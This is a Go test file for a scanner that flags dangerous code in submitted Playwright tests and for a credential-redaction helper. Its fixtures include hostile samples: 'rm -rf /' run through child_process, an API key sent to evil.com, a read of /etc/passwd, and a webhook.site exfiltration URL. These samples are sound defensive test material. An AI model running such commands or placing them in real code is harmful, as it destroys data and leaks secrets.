package main

import (
	"strings"
	"testing"
)

func TestScanCodeSecurity_Clean(t *testing.T) {
	// Valid Playwright test code should pass
	code := `const { test, expect } = require('@playwright/test');
test('loads page', async ({ page }) => {
    await page.goto('https://example.com');
    await expect(page).toHaveTitle(/Example/);
});`
	violations := scanCodeSecurity(code)
	if len(violations) > 0 {
		t.Errorf("Clean code should pass, got violations: %v", violations)
	}
}

func TestScanCodeSecurity_ChildProcess(t *testing.T) {
	code := `require('child_process').exec('rm -rf /');
test('bad', async () => {});`
	violations := scanCodeSecurity(code)
	if len(violations) == 0 {
		t.Error("Should detect child_process")
	}
}

func TestScanCodeSecurity_Eval(t *testing.T) {
	code := `test('bad', async () => { eval('malicious code'); });`
	violations := scanCodeSecurity(code)
	if len(violations) == 0 {
		t.Error("Should detect eval()")
	}
}

func TestScanCodeSecurity_ProcessEnv(t *testing.T) {
	code := `test('leak', async () => {
        const key = process.env.API_KEY;
        await fetch('https://evil.com?key=' + key);
    });`
	violations := scanCodeSecurity(code)
	if len(violations) == 0 {
		t.Error("Should detect process.env")
	}
}

func TestScanCodeSecurity_FsImport(t *testing.T) {
	code := `const fs = require('fs');
test('read secrets', async () => { fs.readFileSync('/etc/passwd'); });`
	violations := scanCodeSecurity(code)
	if len(violations) == 0 {
		t.Error("Should detect fs import")
	}
}

func TestScanCodeSecurity_ESImport(t *testing.T) {
	code := `import { exec } from 'child_process';
test('bad', async () => { exec('whoami'); });`
	violations := scanCodeSecurity(code)
	if len(violations) == 0 {
		t.Error("Should detect ES import of child_process")
	}
}

func TestScanCodeSecurity_SuspiciousURL(t *testing.T) {
	code := `test('exfil', async ({ page }) => {
        await page.goto('https://webhook.site/abc123');
    });`
	violations := scanCodeSecurity(code)
	if len(violations) == 0 {
		t.Error("Should detect webhook.site URL")
	}
}

func TestScanCodeSecurity_AllowedURLs(t *testing.T) {
	code := `test('ok', async ({ page }) => {
        await page.goto('https://localhost:3000');
        await page.goto('https://app.qualitymax.io');
    });`
	violations := scanCodeSecurity(code)
	if len(violations) > 0 {
		t.Errorf("Localhost and qualitymax URLs should be allowed, got: %v", violations)
	}
}

func TestRedactSensitiveMasksKnownCredentialShapes(t *testing.T) {
	input := `Authorization: Bearer abc.def-123
api_key="qm-live-secret"
token: sk-ant-supersecret
raw=sk-ant-rawsecret
url=https://user:pass@llm.example.com/v1`

	got := redactSensitive(input)
	for _, leaked := range []string{"abc.def-123", "qm-live-secret", "sk-ant-supersecret", "user:pass@"} {
		if strings.Contains(got, leaked) {
			t.Fatalf("redacted output leaked %q: %s", leaked, got)
		}
	}
	for _, want := range []string{"Bearer [REDACTED]", `api_key="[REDACTED]"`, "sk-ant-[REDACTED]", "user:[REDACTED]@"} {
		if !strings.Contains(got, want) {
			t.Fatalf("redacted output missing %q: %s", want, got)
		}
	}
}

func TestScanCodeSecurity_NoTestFunction(t *testing.T) {
	code := `console.log('not a test file');`
	violations := scanCodeSecurity(code)
	found := false
	for _, v := range violations {
		// Updated message wording after language-aware check — matches both
		// the old "No test()" and the new "No test declaration".
		if strings.Contains(v, "No test") {
			found = true
		}
	}
	if !found {
		t.Error("Should detect missing test declaration")
	}
}

func TestScanCodeSecurity_TooLarge(t *testing.T) {
	code := strings.Repeat("x", 100001) + "\ntest('x', async () => {});"
	violations := scanCodeSecurity(code)
	found := false
	for _, v := range violations {
		if strings.Contains(v, "100KB") {
			found = true
		}
	}
	if !found {
		t.Error("Should detect oversized code")
	}
}

func TestScanCodeSecurity_SpawnExec(t *testing.T) {
	code := `test('cmd', async () => { execSync('ls'); });`
	violations := scanCodeSecurity(code)
	if len(violations) == 0 {
		t.Error("Should detect execSync")
	}
}

func TestScanCodeSecurity_NewFunction(t *testing.T) {
	code := `test('dynamic', async () => { new Function('return 1')(); });`
	violations := scanCodeSecurity(code)
	if len(violations) == 0 {
		t.Error("Should detect new Function()")
	}
}

func TestScanCodeSecurity_GlobalThis(t *testing.T) {
	code := `test('global', async () => { globalThis.x = 1; });`
	violations := scanCodeSecurity(code)
	if len(violations) == 0 {
		t.Error("Should detect globalThis")
	}
}
